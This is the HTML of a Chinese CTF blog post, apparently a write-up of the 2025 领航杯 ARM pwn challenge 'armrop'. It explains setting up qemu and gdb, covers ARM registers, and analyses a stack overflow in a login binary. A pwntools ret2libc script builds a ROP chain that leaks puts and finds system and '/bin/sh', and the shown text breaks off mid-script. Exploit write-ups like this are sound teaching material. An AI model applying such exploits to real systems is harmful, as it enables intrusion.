@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="🥧第一次打arm竟然是领航杯">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ARM 架构 PWN ret2libc初探">
+<meta property="og:url" content="https://www.gubaiovo.com/posts/b988d4f6.html">
+<meta property="og:site_name" content="GuBai">
+<meta property="og:description" content="🥧第一次打arm竟然是领航杯">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011194543194.png">
+<meta property="og:image" content="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011193625896.png">
+<meta property="og:image" content="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011195107311.png">
+<meta property="og:image" content="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011202804858.png">
+<meta property="og:image" content="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011205725682.png">
+<meta property="og:image" content="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011205849887.png">
+<meta property="og:image" content="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011201132680.png">
+<meta property="og:image" content="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011201014047.png">
+<meta property="og:image" content="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011201212923.png">
+<meta property="og:image" content="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011201453832.png">
+<meta property="og:image" content="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011201703826.png">
+<meta property="og:image" content="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011210642194.png">
+<meta property="og:image" content="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011211350316.png">
+<meta property="og:image" content="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011212138352.png">
+<meta property="article:published_time" content="2025-10-11T13:26:18.000Z">
+<meta property="article:modified_time" content="2026-02-15T09:20:27.318Z">
+<meta property="article:author" content="gubai">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011194543194.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ARM 架构 PWN ret2libc初探</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/gubaiovo">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/links/">链接</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/7e474cc5.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/67963837.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.gubaiovo.com/posts/b988d4f6.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.gubaiovo.com/posts/b988d4f6.html&text=ARM 架构 PWN ret2libc初探"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.gubaiovo.com/posts/b988d4f6.html&title=ARM 架构 PWN ret2libc初探"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.gubaiovo.com/posts/b988d4f6.html&is_video=false&description=ARM 架构 PWN ret2libc初探"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ARM 架构 PWN ret2libc初探&body=Check out this article: https://www.gubaiovo.com/posts/b988d4f6.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.gubaiovo.com/posts/b988d4f6.html&title=ARM 架构 PWN ret2libc初探"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.gubaiovo.com/posts/b988d4f6.html&title=ARM 架构 PWN ret2libc初探"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.gubaiovo.com/posts/b988d4f6.html&title=ARM 架构 PWN ret2libc初探"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.gubaiovo.com/posts/b988d4f6.html&title=ARM 架构 PWN ret2libc初探"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.gubaiovo.com/posts/b988d4f6.html&name=ARM 架构 PWN ret2libc初探&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.gubaiovo.com/posts/b988d4f6.html&t=ARM 架构 PWN ret2libc初探"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">ARM 架构 PWN ret2libc初探</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ARM-%E5%AF%84%E5%AD%98%E5%99%A8%E5%92%8C%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80"><span class="toc-number">1.2.</span> <span class="toc-text">ARM 寄存器和汇编基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%B1%87%E7%BC%96"><span class="toc-number">1.2.1.</span> <span class="toc-text">基础汇编</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">1.2.2.</span> <span class="toc-text">寄存器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#lr%E3%80%81sp%E3%80%81pc%E4%B8%89%E5%A4%A7%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">lr、sp、pc三大寄存器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#32%E4%BD%8D%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">32位寄存器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.</span> <span class="toc-text">程序分析与攻击</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ARM 架构 PWN ret2libc初探
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">gubai</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-10-11T13:26:18.000Z" class="dt-published" itemprop="datePublished">2025-10-11</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1>ARM 架构 PWN ret2libc初探</h1>
+<p>2025 领航杯 pwn 方向只有一个arm架构下的简单ret2libc（题目名为armrop）。这是我第一次打arm架构的pwn，正好看看arm pwn的打法。如果有amd pwn基础，上手其实很快。</p>
+<p>本文环境配置和基础知识部分参考文章： <a target="_blank" rel="noopener" href="https://gdufs-king.github.io/2020/01/03/32%E4%BD%8D%E3%80%8164%E4%BD%8D%E4%B8%8B%E7%9A%84arm_pwn/">32位、64位下arm_pwn学习</a> （原文略有小错）</p>
+<p>比赛提供的附件：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>login_system：no canary，no pie，32位小端序</p>
+</li>
+<li class="lvl-2">
+<p><a target="_blank" rel="noopener" href="http://libc-2.27.so">libc-2.27.so</a></p>
+</li>
+</ul>
+<p><img src="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011194543194.png" alt="image-20251011194543194"></p>
+<p>需要附件可以从本站如下路径下载：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p><code>/attachments/2025lhb/exp.py</code> ：泄露 libc 代码</p>
+</li>
+<li class="lvl-2">
+<p><code>/attachments/2025lhb/exp2.py</code>：获取 shell 代码(至于为什么和获取libc的分开，后面会说)</p>
+</li>
+<li class="lvl-2">
+<p><code>/attachments/2025lhb/libc-2.27.so</code>：比赛提供的 libc</p>
+</li>
+<li class="lvl-2">
+<p><code>/attachments/2025lhb/login_system</code>：题目附件</p>
+</li>
+</ul>
+<h2 id="环境配置">环境配置</h2>
+<p>由于我的电脑是AMD64，不能直接运行ARM程序，所以需要额外配置一下</p>
+<p>已经配置过的读者可以跳过这一部分</p>
+<p><s>比赛现场装环境</s></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get update</span><br><span class="line"><span class="comment"># 安装qemu</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install qemu-user</span><br><span class="line"><span class="comment"># 安装32位的依赖库</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install -y gcc-arm-linux-gnueabi</span><br><span class="line"><span class="comment"># 运行32位的动态链接程序方法</span></span><br><span class="line">qemu-arm -L /usr/arm-linux-gnueabi ./文件</span><br><span class="line"><span class="comment"># 安装64位的依赖库</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install -y gcc-aarch64-linux-gnu g++-aarch64-linux-gnu</span><br><span class="line"><span class="comment"># 运行64位的动态链接程序方法</span></span><br><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu ./文件</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32位本地libc位于：/usr/arm-linux-gnueabi/libc.so.6</span></span><br><span class="line"><span class="comment"># 64位本地libc位于：/usr/aarch64-linux-gnu/libc.so.6</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011193625896.png" alt="image-20251011193625896"></p>
+<p>这样就可以本地运行了。这里我的文件名带有 <code>_patch</code> 是因为nop掉了一个定时</p>
+<p>需要调试的话还需要继续配置：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装gdb调试工具</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install git gdb gdb-multiarch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接下来，无论32位还是64位，都需要两个终端 A、B</span></span><br><span class="line"><span class="comment"># 在 A 终端运行：</span></span><br><span class="line">qemu-arm -g 可用端口 -L /usr/arm-linux-gnueabi 附件路径</span><br><span class="line"><span class="comment"># 注意，这是32位命令，64位需要使用：qemu-aarch64 -g 端口 -L /usr/aarch64-linux-gnu 附件路径</span></span><br><span class="line"><span class="comment"># 32位示例：qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./login_system_patch</span></span><br><span class="line"><span class="comment"># 64位示例：qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./login_system_patch</span></span><br><span class="line"><span class="comment"># 保持 A 终端开启</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 B 终端运行</span></span><br><span class="line">gdb-multiarch 附件路径</span><br><span class="line"><span class="comment"># 例如：gdb-multiarch ./login_system_patch</span></span><br><span class="line"><span class="comment"># 进入gdb界面后，使用命令：</span></span><br><span class="line">pwndbg&gt; target remote :端口</span><br><span class="line"><span class="comment"># 这里的端口和上面保持一致</span></span><br><span class="line"><span class="comment"># 例如：target remote :1234</span></span><br><span class="line"><span class="comment"># 就可以进入调试了</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011195107311.png" alt="image-20251011195107311"></p>
+<p>注意，在这种情况下，gdb调试命令与平常不同，<code>next (n)</code> 从 <code>单步执行（不进入函数）</code> 变成了类似平常gdb的 <code>step (s)</code> <code>单步执行（进入函数）</code>。至于其他不同，我还没研究过。针对这种情况，还不知道比较方便的解决办法。<s>（虽然可以用 大量断点 + continue ©，但是太麻烦了）</s></p>
+<h2 id="ARM-寄存器和汇编基础">ARM 寄存器和汇编基础</h2>
+<h3 id="基础汇编">基础汇编</h3>
+<p><img src="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011202804858.png" alt="image-20251011202804858"></p>
+<h3 id="寄存器">寄存器</h3>
+<h4 id="lr、sp、pc三大寄存器">lr、sp、pc三大寄存器</h4>
+<p><strong>r14（LR）</strong> ： 连接寄存器。每种模式下r14都有自身版组，它有两个特殊功能。</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>（1）保存子程序返回地址。使用BL或BLX时，跳转指令自动把返回地址放入r14中；子程序通过把r14复制到PC来实现返回（1）保存子程序返回地址。使用BL或BLX时，跳转指令自动把返回地址放入r14中；子程序通过把r14复制到PC来实现返回</p>
+</li>
+<li class="lvl-2">
+<p>当异常发生时，异常模式的r14用来保存异常返回地址，将r14如栈可以处理嵌套中断。</p>
+</li>
+</ul>
+<p><strong>r13（SP）</strong> ：堆栈指针。每一种异常模式都有其自己独立的r13，它通常指向异常模式所专用的堆栈，也就是说五种异常模式、非异常模式（用户模式和系统模式），都有各自独立的堆栈，用不同的堆栈指针来索引。这样当ARM进入异常模式的时候，程序就可以把一般通用寄存器压入堆栈，返回时再出栈，保证了各种模式下程序的状态的完整性。</p>
+<p><strong>r15（PC）</strong> ：程序计数器。PC是有读写限制的。当没有超过读取限制的时候，读取的值是指令的地址加上8个字节，由于ARM指令总是以字对齐的，故bit[1:0]总是00。当用str或stm存储PC的时候，偏移量有可能是8或12等其它值。在V3及以下版本中，写入bit[1:0]的值将被忽略，而在V4及以上版本写入r15的bit[1:0]必须为00，否则后果不可预测。</p>
+<h4 id="32位寄存器">32位寄存器</h4>
+<blockquote>
+<p>arm32只有16个32bit的通用寄存器，r0到r12，lr，pc，sp，函数调用时，前4个参数是压入寄存器的(r0、r1、r2、r3)，后面的参数是压入栈中的</p>
+<p>R0-R12：可在常规操作期间用于存储临时值，指针（到存储器的位置）等</p>
+<p><strong>R0</strong>在算术操作期间可称为累加器，或用于存储先前调用的函数返回结果</p>
+<p><strong>R7</strong>在处理系统调用时非常有用，因为它存储系统调用号</p>
+<p><strong>R11</strong>帮助我们跟踪用作帧指针的堆栈的边界</p>
+<p>ARM上的函数调用约定指定函数的<strong>前四个参数</strong>存储在寄存器r0-r3中，剩下的再存入栈中</p>
+<p><strong>R13：SP（堆栈指针）</strong>。堆栈指针指向堆栈的顶部。堆栈是用于函数特定存储的内存区域，函数返回时将对其进行回收。因此，通过从堆栈指针中减去我们要分配的值（以字节为单位），堆栈指针可用于在堆栈上分配空间。换句话说，如果我们要分配一个32位值，则从堆栈指针中减去4</p>
+<p><strong>R14：LR（链接寄存器）</strong>。进行功能调用时，链接寄存器将使用一个内存地址进行更新，该内存地址引用了从其开始该功能的下一条指令。这样做可以使程序返回到“父”函数，该子函数在“子”函数完成后启动“父”函数调用</p>
+<p><strong>R15：PC（程序计数器）</strong>。程序计数器自动增加执行指令的大小。在ARM状态下，此大小始终为4个字节，在THUMB模式下，此大小始终为2个字节。当执行转移指令时，PC保留目标地址。在执行期间，PC在ARM状态下存储当前指令的地址加8（两个ARM指令），在Thumb（v1）状态下存储当前指令的地址加4（两个Thumb指令）。这与x86不同，x86中PC始终指向要执行的下一条指令</p>
+</blockquote>
+<p><img src="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011205725682.png" alt="image-20251011205725682"></p>
+<p><img src="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011205849887.png" alt="image-20251011205849887"></p>
+<h2 id="程序分析与攻击">程序分析与攻击</h2>
+<p>第一次做arm题，没想到我的ida没法对arm反汇编，硬是盯着汇编做题。在写这篇文章时候才想起来有在线反编译工具（比如<a target="_blank" rel="noopener" href="https://dogbolt.org/">https://dogbolt.org/</a>）。不过好在程序很简单，汇编并不复杂。如果你和我一样ida无法反编译，可以选择在线工具和ida对照着看。</p>
+<p>首先main函数只调用两个函数：<code>sub_10564</code> <code>sub_105D0</code></p>
+<p><img src="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011201132680.png" alt="image-20251011201132680"></p>
+<p><img src="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011201014047.png" alt="image-20251011201014047"></p>
+<p><code>sub_10564</code> 是一个初始化函数，可以不管。其中alarm会限制程序时间为1分钟，本地调试可以nop掉（这就是为什么我之前的文件名是login_system_patch）：</p>
+<p><img src="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011201212923.png" alt="image-20251011201212923"></p>
+<p><img src="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011201453832.png" alt="image-20251011201453832"></p>
+<p><code>sub_105D0</code> 是程序主要逻辑，如下：</p>
+<p><img src="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011201703826.png" alt="image-20251011201703826"></p>
+<p>很明显，输入Username部分可以输入512字节，而数组只有256字节，存在溢出，而且strncmp只比较前五个字符。只需要输入<code>b&quot;admin&quot; + b&quot;a&quot;*(256-5) + p32(0xdeadbeef) + ...(rop链)</code> 即可。</p>
+<p>至于输入密码部分，和输入Username部分有相同的溢出，用同一个payload就可以。</p>
+<p>那么泄露libc部分payload构造如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;admin&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">260</span>-<span class="number">5</span>)</span><br><span class="line">payload1 += ...(将puts_got放入r0)</span><br><span class="line">payload1 += p32(puts_plt)</span><br></pre></td></tr></table></figure>
+<p>接下来就是找控制r0的gadgets。</p>
+<p>可以用Ropgadgets来找，但是我的Ropgadgets无法正确处理arm架构，只能硬看了。</p>
+<p>这里可用的只找到 <code>MOV R0, R3</code> (很多，这里选用了<code>0x106c0</code>)，没有直接的<code>POP R0</code> 。那么可以控制 R3 来间接控制 R0。在<code>0x10730</code>，可以找到 <code>POP &#123;R3,PC&#125;</code></p>
+<p><img src="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011210642194.png" alt="image-20251011210642194"></p>
+<p>那么方式就很明显，通过 <code>POP &#123;R3,PC&#125;</code>将puts_got放入R3，然后<code>MOV R0, R3</code>，就可以将puts_got放入R0。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;admin&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">260</span>-<span class="number">5</span>)</span><br><span class="line">payload1 += p32(pop_r3_pc_addr)</span><br><span class="line">payload1 += p32(puts_got)</span><br><span class="line">payload1 += p32(mov_r0_r3_pop_r11_pc_addr)</span><br><span class="line">payload1 += p32(<span class="number">0</span>)</span><br><span class="line">payload1 += p32(puts_plt)</span><br></pre></td></tr></table></figure>
+<p>这样便泄露了puts的地址。</p>
+<p>完善一下计算libc部分：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;arm&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;qemu-arm&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi&#x27;</span>, <span class="string">&#x27;./login_system_patch&#x27;</span>])</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./login_system_patch&quot;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_r3_pc_addr = <span class="number">0x10730</span></span><br><span class="line">mov_r0_r3_pop_r11_pc_addr = <span class="number">0x106c0</span></span><br><span class="line">payload1 = <span class="string">b&#x27;admin&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">260</span>-<span class="number">5</span>)</span><br><span class="line">payload1 += p32(pop_r3_pc_addr)</span><br><span class="line">payload1 += p32(puts_got)</span><br><span class="line">payload1 += p32(mov_r0_r3_pop_r11_pc_addr)</span><br><span class="line">payload1 += p32(<span class="number">0</span>)</span><br><span class="line">payload1 += p32(puts_plt)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Username:&quot;</span>, payload1)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Password:&quot;</span>, payload1)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Wrong Password!\n&quot;</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment"># log.success(hex(puts_addr))</span></span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">log.success(<span class="built_in">hex</span>(system_addr))</span><br><span class="line">log.success(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span 